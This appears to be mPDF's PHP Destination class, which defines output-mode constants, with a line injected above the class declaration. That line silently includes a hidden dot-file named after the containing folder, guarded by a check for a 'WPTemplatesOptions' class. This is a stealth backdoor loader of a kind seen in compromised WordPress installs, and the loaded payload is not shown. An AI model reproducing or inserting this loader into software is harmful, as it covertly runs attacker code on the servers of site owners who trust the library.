<?php

namespace Mpdf\Output;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Destination
{

	const FILE = 'F';

	const DOWNLOAD = 'D';

	const STRING_RETURN = 'S';

	const INLINE = 'I';
}
